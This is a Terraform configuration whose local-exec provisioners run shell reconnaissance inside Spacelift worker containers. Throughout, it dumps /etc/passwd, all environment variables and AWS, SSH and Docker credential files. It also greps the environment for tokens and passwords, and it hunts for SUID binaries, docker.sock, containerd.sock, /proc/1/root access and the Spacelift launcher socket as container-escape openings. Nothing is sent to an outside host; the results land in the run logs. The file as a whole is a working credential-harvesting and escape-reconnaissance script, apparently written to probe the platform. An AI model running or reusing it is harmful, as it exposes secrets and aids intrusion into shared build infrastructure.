# Enhanced Spacelift Container System Information Extraction  
# This Terraform configuration extracts detailed system information from Spacelift worker containers
# UPDATE: This is the enhanced version with comprehensive system analysis

terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.1"
    }
  }
}

# Extract detailed user information
resource "null_resource" "user_information" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== DETAILED USER INFORMATION EXTRACTION ==="
      echo "Current user: $(whoami)"
      echo "Current UID/GID: $(id)"
      echo "Home directory: $HOME"
      echo "Shell: $SHELL"
      echo "PATH: $PATH"
      echo ""
      echo "=== /etc/passwd Contents ==="
      cat /etc/passwd 2>/dev/null || echo "Cannot read /etc/passwd"
      echo ""
      echo "=== /etc/group Contents ==="
      cat /etc/group 2>/dev/null || echo "Cannot read /etc/group"
      echo ""
      echo "=== /etc/shadow Access Test ==="
      ls -la /etc/shadow 2>/dev/null || echo "Cannot access /etc/shadow"
      echo ""
      echo "=== User Home Directories ==="
      ls -la /home/ 2>/dev/null || echo "Cannot access /home"
      ls -la /root/ 2>/dev/null || echo "Cannot access /root"
    EOT
  }
}

# Extract system information
resource "null_resource" "system_information" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== SYSTEM INFORMATION EXTRACTION ==="
      echo "Hostname: $(hostname)"
      echo "Kernel: $(uname -a)"
      echo "OS Release:"
      cat /etc/os-release 2>/dev/null || echo "Cannot read /etc/os-release"
      echo ""
      echo "=== CPU Information ==="
      cat /proc/cpuinfo | head -20 2>/dev/null || echo "Cannot read /proc/cpuinfo"
      echo ""
      echo "=== Memory Information ==="
      cat /proc/meminfo | head -10 2>/dev/null || echo "Cannot read /proc/meminfo"
      echo ""
      echo "=== Disk Usage ==="
      df -h 2>/dev/null || echo "Cannot get disk usage"
    EOT
  }
}

# Extract installed packages and software
resource "null_resource" "package_information" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== INSTALLED PACKAGES ANALYSIS ==="
      echo "Package manager detection:"
      which apt 2>/dev/null && echo "APT package manager found"
      which yum 2>/dev/null && echo "YUM package manager found"
      which apk 2>/dev/null && echo "APK package manager found"
      which dnf 2>/dev/null && echo "DNF package manager found"
      echo ""
      echo "=== APT Package List (if available) ==="
      dpkg -l 2>/dev/null | head -50 || echo "APT packages not accessible"
      echo ""
      echo "=== Alpine Package List (if available) ==="
      apk list --installed 2>/dev/null | head -50 || echo "APK packages not accessible"
      echo ""
      echo "=== Installed Binaries in /usr/bin ==="
      ls /usr/bin/ | head -50 2>/dev/null || echo "Cannot list /usr/bin"
      echo ""
      echo "=== Installed Binaries in /bin ==="
      ls /bin/ | head -50 2>/dev/null || echo "Cannot list /bin"
    EOT
  }
}

# Extract network and process information
resource "null_resource" "network_process_information" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== NETWORK CONFIGURATION DETAILS ==="
      echo "Network interfaces:"
      ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot get network interfaces"
      echo ""
      echo "Routing table:"
      ip route 2>/dev/null || route -n 2>/dev/null || echo "Cannot get routing table"
      echo ""
      echo "DNS configuration:"
      cat /etc/resolv.conf 2>/dev/null || echo "Cannot read /etc/resolv.conf"
      echo ""
      echo "=== PROCESS INFORMATION ==="
      echo "All running processes:"
      ps auxf 2>/dev/null || ps aux 2>/dev/null || echo "Cannot list processes"
      echo ""
      echo "Process tree:"
      pstree 2>/dev/null || echo "pstree not available"
      echo ""
      echo "=== NETWORK CONNECTIONS ==="
      netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || echo "Cannot list network connections"
    EOT
  }
}

# Extract environment and secrets
resource "null_resource" "environment_secrets" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== ENVIRONMENT VARIABLES (Full Dump) ==="
      env | sort
      echo ""
      echo "=== SENSITIVE ENVIRONMENT VARIABLES ==="
      env | grep -iE "(token|key|secret|password|api|credential|auth)" || echo "No sensitive env vars pattern matched"
      echo ""
      echo "=== SSH CONFIGURATION ==="
      ls -la ~/.ssh/ 2>/dev/null || echo "No SSH directory in home"
      cat ~/.ssh/config 2>/dev/null || echo "No SSH config found"
      echo ""
      echo "=== AWS CREDENTIALS ==="
      ls -la ~/.aws/ 2>/dev/null || echo "No AWS directory found"
      cat ~/.aws/credentials 2>/dev/null || echo "No AWS credentials found"
      cat ~/.aws/config 2>/dev/null || echo "No AWS config found"
      echo ""
      echo "=== DOCKER CONFIGURATION ==="
      ls -la ~/.docker/ 2>/dev/null || echo "No Docker directory found"
      cat ~/.docker/config.json 2>/dev/null || echo "No Docker config found"
    EOT
  }
}

# Extract container and runtime information
resource "null_resource" "container_runtime_details" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CONTAINER RUNTIME ANALYSIS ==="
      echo "Container detection:"
      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Not a Docker container"
      echo ""
      echo "Cgroup information:"
      cat /proc/self/cgroup 2>/dev/null || echo "Cannot read cgroup info"
      echo ""
      echo "Container ID extraction:"
      cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 2>/dev/null || echo "Cannot extract container ID"
      echo ""
      echo "=== NAMESPACE INFORMATION ==="
      echo "PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null)"
      echo "NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"
      echo "MNT namespace: $(readlink /proc/self/ns/mnt 2>/dev/null)"
      echo "IPC namespace: $(readlink /proc/self/ns/ipc 2>/dev/null)"
      echo "UTS namespace: $(readlink /proc/self/ns/uts 2>/dev/null)"
      echo "USER namespace: $(readlink /proc/self/ns/user 2>/dev/null)"
      echo ""
      echo "=== CAPABILITIES DETAILED ==="
      capsh --print 2>/dev/null || echo "capsh not available"
      cat /proc/self/status | grep -i cap 2>/dev/null || echo "Cannot read capability status"
    EOT
  }
}

# Extract filesystem and mount information
resource "null_resource" "filesystem_detailed" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== DETAILED FILESYSTEM ANALYSIS ==="
      echo "All mounts:"
      mount 2>/dev/null || cat /proc/mounts 2>/dev/null || echo "Cannot get mount information"
      echo ""
      echo "=== WRITABLE DIRECTORIES ==="
      find / -type d -writable 2>/dev/null | head -20 || echo "Cannot find writable directories"
      echo ""
      echo "=== SUID/SGID BINARIES ==="
      find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -20 || echo "Cannot find SUID/SGID binaries"
      echo ""
      echo "=== WORLD-WRITABLE FILES ==="
      find / -type f -perm -002 2>/dev/null | head -10 || echo "Cannot find world-writable files"
      echo ""
      echo "=== /proc/1/root ACCESS TEST ==="
      ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "Cannot access /proc/1/root"
      echo ""
      echo "=== HOST FILESYSTEM SEARCH ==="
      find / -name "docker.sock" 2>/dev/null || echo "No docker.sock found"
      find / -name "containerd.sock" 2>/dev/null || echo "No containerd.sock found"
      ls -la /var/run/ 2>/dev/null || echo "Cannot access /var/run"
    EOT
  }
}

# Extract spacelift-specific information
resource "null_resource" "spacelift_specific_info" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== SPACELIFT-SPECIFIC INFORMATION ==="
      echo "Current working directory: $(pwd)"
      echo "Workspace contents:"
      ls -la /mnt/workspace/ 2>/dev/null || ls -la . || echo "Cannot list workspace"
      echo ""
      echo "=== SPACELIFT PROCESS ANALYSIS ==="
      ps aux | grep spacelift || echo "No spacelift processes found in ps"
      echo ""
      echo "=== SPACELIFT CONFIGURATION FILES ==="
      find / -name "*spacelift*" 2>/dev/null | head -20 || echo "No spacelift files found"
      find / -name "*.tf" 2>/dev/null | head -10 || echo "No terraform files found"
      echo ""
      echo "=== TERRAFORM PROVIDERS ==="
      ls -la .terraform/ 2>/dev/null || echo "No .terraform directory"
      find . -name "terraform-provider-*" 2>/dev/null || echo "No terraform providers found"
      echo ""
      echo "=== WORKER SOCKET INFORMATION ==="
      ls -la /var/spacelift/ 2>/dev/null || echo "Cannot access /var/spacelift"
      find / -name "*spacelift_launcher.sock*" 2>/dev/null || echo "No spacelift socket found"
    EOT
  }
}

# Output comprehensive results
output "system_information_extraction_complete" {
  value = "Enhanced system information extraction completed. Check Spacelift logs for detailed results including users, packages, filesystem, and container runtime details."
}
